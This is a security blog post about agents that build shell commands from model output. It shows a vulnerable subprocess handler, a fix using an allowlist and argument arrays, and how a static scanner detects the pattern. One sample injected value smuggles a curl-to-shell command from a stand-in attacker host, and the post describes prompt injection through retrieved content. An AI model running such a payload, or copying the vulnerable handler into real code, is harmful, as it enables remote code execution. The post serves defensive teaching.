---
title: "ASI05: when your agent builds a shell command out of model output"
description: "A real exec() call built from model output, why input validation misses it, the fix, and how ASIScan's rules catch it."
date: 2026-09-29
slug: asi05-unexpected-code-execution
tags: ["AIsecurity", "agent-security", "ASI05"]
canonical: https://asiscan.dev/blog/asi05-unexpected-code-execution
---

Twenty-five of the fifty agent repositories in our scan corpus had a code-execution finding. That's half. Not half doing something exotic — half doing the same three or four things, over and over, because the pattern is easy to write and easy to miss in review.

This is ASI05: Unexpected Code Execution. It's the risk on this list that needs the least explaining, which makes it a good place to start if you're new to this cluster.

## What the risk actually is

Somewhere in your agent, a tool handler takes an argument the model produced and hands it to something that executes: `eval()`, `exec()`, a shell call, a subprocess. The model is not a trusted caller. It's a text generator that has read tool descriptions, retrieved documents, and possibly attacker-controlled content from a web page or a file. If any of that reaches the executed string, whoever controlled the input the model read now controls what your process runs.

The reflex is to say "we validate user input." That's true and it doesn't help here. The dangerous string isn't the user's prompt. It's the model's *output* — the thing your validation layer, if you have one, was written to check the other side of.

## A concrete failure

A common shape, paraphrased from the kind of tool handler that shows up across agent frameworks — not any one project, just the pattern:

```python
def run_tool(tool_call):
    command = tool_call["arguments"]["command"]
    result = subprocess.run(f"git log {command}", shell=True, capture_output=True)
    return result.stdout
```

The model was asked to supply a git ref or flag. It supplies `--help; curl attacker.example | sh`. `shell=True` plus string interpolation means the shell parses that semicolon as a command separator, not as an argument. The agent just executed something the model wrote, because a tool description or a piece of retrieved content told the model to.

Nothing about the user's original prompt has to be malicious for this to fire. The instruction can arrive through a fetched web page, a retrieved document, or a poisoned tool result three turns earlier. By the time it reaches `subprocess.run`, it looks exactly like a legitimate argument.

## The same code done correctly

```python
ALLOWED_FLAGS = {"--oneline", "--graph", "-n"}

def run_tool(tool_call):
    flag = tool_call["arguments"]["flag"]
    if flag not in ALLOWED_FLAGS:
        raise ValueError(f"flag not permitted: {flag}")
    result = subprocess.run(
        ["git", "log", flag],
        shell=False,
        capture_output=True,
        timeout=5,
    )
    return result.stdout
```

Three things changed. The command is an argument array, not an interpolated string, so there's no shell to parse metacharacters. The flag is checked against an allowlist before it's used, not just type-checked. And the call has a timeout, so a hung or adversarial process doesn't hang the agent loop indefinitely — that's a different rule (ASI08) but it's the same instinct: assume the thing you're calling can misbehave.

If the tool genuinely needs to run arbitrary code — a code-interpreter tool is a legitimate pattern — the fix isn't an allowlist, it's a sandbox: no network egress, a resource-limited container, a filesystem the agent can't escape.

## How to detect it

This is ASI05 in ASIScan, one of eighteen rules covering the OWASP Agentic categories, the OWASP LLM Top 10 2025 numbering, and two EU AI Act Article 50 checks. ASI05 runs both a presence probe and a control probe: it flags `eval()` or equivalent called on a non-literal value directly, it flags a shell string built by concatenation or interpolation, and — separately — it flags a code-execution tool exposed to the agent with no evidence of sandboxing or egress restriction anywhere in the project, even if no single line looks dangerous on its own.

That last part matters. Most of these rules aren't grepping for `eval(` and calling it a day — they check whether a risk trigger is present *and* whether the codebase shows evidence of the standard mitigation. A `// TODO: sandbox this` comment doesn't count as evidence; comments are stripped before mitigation matching happens.

In this corpus, ASI05 findings showed up in 25 of 50 repositories, 140 findings total, all flagged critical. It was the second most widespread rule by repository count after ASI03 (identity and privilege issues, 35 of 50).

Be clear about what this is and isn't. ASIScan is regex-based, not AST-based. It doesn't execute a data-flow graph to prove the model's output reaches the sink — it recognises the shape of the pattern. That means false positives: a hardcoded allowlist check ten lines above a `subprocess.run` might not be visible to a regex the way it would be to a human reading the function. It also means false negatives: sufficiently indirect flows, wrapped in a few layers of abstraction, won't match. Precision for the current release is being re-measured across a 50-repository corpus; the last published figure, roughly 55% on five open-source frameworks, was measured against the August 2026 build, before a round of false-positive fixes, and shouldn't be read as current.

Framework repositories also legitimately show ASI05 control-probe findings for sandboxing decisions that are the caller's responsibility, not the framework's. A finding is a signal to check, not a verdict.

## Mitigations

Don't build shell strings from model output. Use argument arrays with `shell=False`. Allowlist the values a model-supplied field is permitted to take wherever the space is small enough to enumerate. Where it isn't, sandbox: no shell, no filesystem beyond a scratch directory, no outbound network. Put a timeout on anything the agent invokes so a stuck subprocess doesn't become a stuck agent. None of this is exotic. It's the same discipline that's applied to user input for twenty years, applied to a new source of untrusted text.

## Notes

Findings from this rule, and from every rule in ASIScan, are static-analysis signals for a human to review — not confirmed vulnerabilities and not a compliance determination. This produces evidence for human assessment. It does not establish compliance with the EU AI Act or any other regulation. Not affiliated with or endorsed by OWASP. OWASP is a registered trademark of the OWASP Foundation.

Run `npx asiscan-cli .` against your own agent code and see what ASI05 turns up.
